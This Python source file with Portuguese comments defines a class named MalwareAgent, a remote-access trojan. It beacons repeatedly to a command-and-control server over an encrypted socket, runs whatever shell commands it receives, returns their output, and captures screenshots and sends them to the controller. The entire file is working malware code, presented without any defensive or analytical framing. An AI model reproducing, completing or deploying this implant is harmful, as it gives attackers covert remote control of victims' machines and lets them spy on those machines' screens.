import socket
import subprocess
import time
import logging
import sys
import os
from typing import Optional

# Ajuste de path para permitir a importação do pacote utilitário comum
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from utils.crypto import CryptoHelper
from modules.screenshot import take_screenshot

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [AGENT-SECURE] - %(message)s')

# Coleta a chave da variável de ambiente no host alvo
CHAVE_AMBIENTE = os.getenv("AGENT_SECRET_KEY")

if not CHAVE_AMBIENTE:
    logging.critical("Variável de ambiente AGENT_SECRET_KEY ausente. Encerrando execução por segurança.")
    sys.exit(1)

# Converte a string da variável para o formato de bytes exigido pelo Fernet
CHAVE_SEC_PADRAO = CHAVE_AMBIENTE.encode("utf-8")

class MalwareAgent:
    """
    Abstração de Engenharia para o Agente Remoto com tratamento de loops e tráfego cifrado.
    """
    def __init__(self, c2_host: str, c2_port: int, buffer_size: int = 4096) -> None:
        self.c2_host: str = c2_host
        self.c2_port: int = c2_port
        self.buffer_size: int = buffer_size
        self.is_running: bool = False
        self._agent_socket: Optional[socket.socket] = None
        # Inicializa o helper de criptografia com a chave de ambiente compartilhada
        self.crypto = CryptoHelper(CHAVE_SEC_PADRAO)

    def execute_system_command(self, command: str) -> str:
        """Executa a instrução no S.O. de forma isolada."""
        try:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate()
            return stdout if stdout else stderr
        except Exception as e:
            return f"[-] Erro de execução no agente local: {str(e)}"

    def start(self) -> None:
        """Inicia o ciclo de vida do agente com loop adaptativo de reconexão (Beaconing)."""
        self.is_running = True
        logging.info("Agente Cifrado Iniciado. Entrando em modo de Beaconing via canais seguros...")

        while self.is_running:
            try:
                self._agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self._agent_socket.connect((self.c2_host, self.c2_port))
                self._process_commands()
            except (socket.error, ConnectionRefusedError):
                # Se o servidor estiver offline, dorme 5 segundos de forma silenciosa e tenta novamente
                time.sleep(5)
            except KeyboardInterrupt:
                self.stop()

    def _process_commands(self) -> None:
        """Trata a decifragem, roteamento e criptografia de ordens vindas do socket."""
        if not self._agent_socket:
            return

        with self._agent_socket:
            while self.is_running:
                try:
                    raw_data: bytes = self._agent_socket.recv(self.buffer_size)
                    if not raw_data:
                        break
                        
                    # Decifra a ordem recebida do painel C2
                    command = self.crypto.decrypt_data(raw_data).decode("utf-8").strip()
                    
                    if command.lower() == "exit":
                        break
                        
                    elif command.lower() == "screenshot":
                        image_bytes = take_screenshot()
                        if image_bytes:
                            # 1. Cifra os bytes brutos da imagem capturada
                            dados_cifrados = self.crypto.encrypt_data(image_bytes)
                            
                            # 2. Prepara o cabeçalho de tamanho com base no tamanho do bloco JÁ CIFRADO
                            size_header = f"{len(dados_cifrados):<16}".encode("utf-8")
                            header_cifrado = self.crypto.encrypt_data(size_header)
                            
                            # 3. Transmite o cabeçalho protetivo e os dados em sequência segura
                            self._agent_socket.sendall(header_cifrado)
                            time.sleep(0.2)  # Pausa defensiva contra coalescência TCP
                            self._agent_socket.sendall(dados_cifrados)
                        else:
                            erro_cifrado = self.crypto.encrypt_data(b"[-] Falha na captura interna do alvo.")
                            self._agent_socket.sendall(erro_cifrado)
                            
                    else:
                        # Execução de comandos do sistema operacional (texto)
                        output_str: str = self.execute_system_command(command)
                        # Cifra a resposta de texto antes de enviar de volta ao C2
                        output_cifrado = self.crypto.encrypt_data(output_str.encode("utf-8"))
                        self._agent_socket.sendall(output_cifrado)
                        
                except socket.error:
                    break

    def stop(self) -> None:
        """Encerra a execução do agente de forma graciosa."""
        self.is_running = False
        if self._agent_socket:
            self._agent_socket.close()
        logging.info("Agente Cifrado encerrado de forma limpa.")